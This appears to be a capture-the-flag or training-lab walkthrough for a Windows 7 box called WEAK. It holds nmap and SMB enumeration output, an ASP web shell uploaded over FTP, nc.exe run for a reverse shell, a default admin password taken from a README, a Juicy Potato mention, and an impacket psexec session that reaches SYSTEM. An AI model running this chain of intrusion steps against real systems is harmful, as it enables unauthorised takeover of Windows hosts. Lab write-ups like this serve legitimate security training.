```Cyber Security Labs: WEAK : 172.31.1.11```


Nmap scans
```
PORT      STATE SERVICE            VERSION                                                                                                                                  
21/tcp    open  ftp                Microsoft ftpd                                                                                                                           
| ftp-syst:                                                                                                                                                                 
|_  SYST: Windows_NT                                                                                                                                                        
80/tcp    open  http               Microsoft IIS httpd 7.5                                                                                                                  
| http-methods:                                                                                                                                                             
|_  Potentially risky methods: TRACE                                                                                                                                        
|_http-server-header: Microsoft-IIS/7.5                                                                                                                                     
|_http-title: IIS7                                                                                                                                                          
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                                                    
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                                            
445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                                               
554/tcp   open  rtsp?                                                                                                                                                       
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)                                                                                                            
2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                  
3389/tcp  open  ssl/ms-wbt-server?                                                                                                                                          
|_ssl-date: 2020-05-19T08:47:52+00:00; 0s from scanner time.                                                                                                                
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                 
|_http-title: Service Unavailable
10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49162/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: WEAK; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h45m00s, deviation: 3h30m01s, median: -1s
|_nbstat: NetBIOS name: WEAK, NetBIOS user: <unknown>, NetBIOS MAC: 02:c8:1e:c0:ba:c0 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1 
|   Computer name: Weak
|   NetBIOS computer name: WEAK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-19T01:46:40-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-19T08:46:41
|_  start_date: 2020-05-19T08:12:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.66 seconds

```

OS detection

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 05:11 EDT
Nmap scan report for 172.31.1.11
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:                       
| smb-os-discovery:                        
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1 
|   Computer name: Weak
|   NetBIOS computer name: WEAK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-19T02:11:15-07:00

```

Share enum

```
nmap --script smb-enum-shares -p139,445 -T4 -Pn 172.31.1.11
Host script results:                       
| smb-enum-shares:                         
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\172.31.1.11\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\172.31.1.11\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\172.31.1.11\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\172.31.1.11\USERS: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED                                                                                                      
|_    Anonymous access: <none>                                                        

Nmap done: 1 IP address (1 host up) scanned in 174.14 seconds
```

Had this weird FTP issue where I was shown the following error.

```
ftp> put cmdasp.asp                                                                                                                                                      
local: cmdasp.asp remote: cmdasp.asp                                                                                                                                        
501 Server cannot accept argument.                                                                                                                                          
ftp: bind: Address already in use
```
To avoid this we had to use the ftp with -p (passively)

Now, I used the ```put``` command into the ftp to add the asp webshell.

Uploaded nc.exe using smb and then executed it to get a reverse shell back.

- Box was vulnerable to Juicy Potato. Unintented way.
- Box had default creds for Admin user in a text folder in C:\Development in README.txt

The password was Password but the admin user was web admin in this case. To log in I tried winexe didnot work.

I downloaded the impacket from github and used the psexec.py from the examples folder inside it.

```zsh
python psexec.py 'web admin'@172.31.1.11
```    
```zsh
Impacket v0.9.22.dev1+20200518.92028.525fa3d0 - Copyright 2020 SecureAuth Corporation                                                  
                                                                                                                                       
Password:                                                                                                                              
[*] Requesting shares on 172.31.1.11.....                                                                                              
[-] share 'ADMIN$' is not writable.                                                                                                    
[-] share 'C$' is not writable.                                                                                                        
[*] Found writable share Development                                                                                                   
[*] Uploading file SEuWiCHt.exe                                                                                                        
[*] Opening SVCManager on 172.31.1.11.....                                                                                             
[*] Creating service Xghz on 172.31.1.11.....                                                                                          
[*] Starting service Xghz.....                                                                                                         
[!] Press help for extra shell commands                                                                                                
Microsoft Windows [Version 6.1.7601]                                                                                                   
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                                        
                                                                                                                                       
C:\Windows\system32>whoami                                         
nt authority\system
```